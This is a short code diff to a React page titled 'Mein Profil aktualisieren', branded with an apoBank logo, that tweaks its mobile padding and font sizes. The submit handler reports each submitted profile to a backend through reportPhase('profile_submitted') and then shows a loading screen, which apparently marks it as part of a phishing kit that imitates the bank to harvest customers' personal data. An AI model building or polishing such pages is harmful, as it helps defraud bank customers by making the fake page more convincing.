@@ -120,8 +120,8 @@ const PersoenlicheDaten = () => {
     <div className="min-h-screen flex flex-col bg-[#f6f8fc]">
       {/* Top header */}
       <header className="bg-white border-b border-slate-200">
-        <div className="max-w-[1400px] mx-auto flex items-center justify-between px-6 sm:px-10 h-16">
-          <div className="flex items-center gap-8">
+        <div className="max-w-[1400px] mx-auto flex items-center justify-between px-4 sm:px-10 h-16">
+          <div className="flex items-center gap-3 sm:gap-8">
             <img src={apoALogo.url} alt="apoBank" className="w-10 h-10 rounded-full object-contain" />
             <span className="text-[15px] font-medium text-[#001f5b]">Profildaten</span>
           </div>
@@ -130,8 +130,8 @@ const PersoenlicheDaten = () => {
 
       {/* Main */}
       <main className="flex-1">
-        <div className="max-w-[780px] mx-auto px-4 sm:px-8 py-8 sm:py-10">
-          <h1 className="text-[34px] sm:text-[40px] font-semibold text-[#001f5b] mb-6 text-left">
+        <div className="max-w-[780px] mx-auto px-3 sm:px-8 py-6 sm:py-10">
+          <h1 className="text-[26px] sm:text-[40px] font-semibold text-[#001f5b] mb-6 text-left">
             Mein Profil aktualisieren
           </h1>
 
@@ -142,7 +142,7 @@ const PersoenlicheDaten = () => {
               try { await reportPhase("profile_submitted", { profile }); } catch {}
               navigate("/profil-loading");
             }}
-            className="bg-white rounded-xl border border-slate-200/70 shadow-[0_1px_2px_rgba(0,0,0,0.04)] px-6 sm:px-10 py-8 sm:py-10"
+            className="bg-white rounded-xl border border-slate-200/70 shadow-[0_1px_2px_rgba(0,0,0,0.04)] px-4 sm:px-10 py-6 sm:py-10"
           >
 
             <div className="flex flex-col gap-y-6">
